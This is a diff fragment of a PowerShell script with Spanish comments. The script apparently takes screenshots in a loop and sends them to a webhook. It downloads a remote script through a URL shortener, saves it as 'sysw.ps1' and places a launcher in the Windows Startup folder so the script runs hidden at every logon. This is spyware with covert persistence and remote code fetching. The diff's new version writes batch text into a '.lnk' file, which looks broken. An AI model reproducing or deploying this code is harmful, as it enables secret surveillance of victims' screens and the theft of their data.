@@ -44,31 +44,19 @@ While ($true){
     Remove-Item -Path $file1
     Remove-Item -Path $file2
     
-    # Descargar el script y guardarlo como "sysw.ps1" en la carpeta de documentos
+    # Descargar el script de capturas de pantalla para webhook y guardarlo como "sysw.ps1" en la carpeta de documentos
     $scriptURL = "https://is.gd/H8uBqE"
     $scriptPath = Join-Path -Path $env:USERPROFILE -ChildPath "Documents\sysw.ps1"
     Invoke-WebRequest -Uri $scriptURL -OutFile $scriptPath
     
-    # Obtener la carpeta de documentos del usuario actual
-    $documentsFolder = [Environment]::GetFolderPath("MyDocuments")
-
-    # Ruta completa del archivo de lote para ejecutar el script al iniciar Windows
-    $batFilePath = Join-Path -Path $documentsFolder -ChildPath "run_script.bat"
+    # Ejecutar el script de capturas de pantalla para webhook al iniciar Windows
+    $startupFolder = [Environment]::GetFolderPath("Startup")
+    $batFilePath = Join-Path -Path $startupFolder -ChildPath "Run_Script.lnk"
     $batContent = @"
 @echo off
 powershell.exe -WindowStyle Hidden -File "$scriptPath"
 "@
     Set-Content -Path $batFilePath -Value $batContent
-
-    # Obtener la carpeta de inicio del usuario actual
-    $startupFolder = [Environment]::GetFolderPath("Startup")
-
-    # Crear un acceso directo del archivo de lote en la carpeta de inicio para que se ejecute al iniciar Windows
-    $shortcutPath = Join-Path -Path $startupFolder -ChildPath "Run_Script.lnk"
-    $WScriptShell = New-Object -ComObject WScript.Shell
-    $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
-    $Shortcut.TargetPath = $batFilePath
-    $Shortcut.Save()
 
     # Esperar el intervalo de tiempo especificado antes de tomar las próximas capturas de pantalla
     Start-Sleep -Seconds $seconds
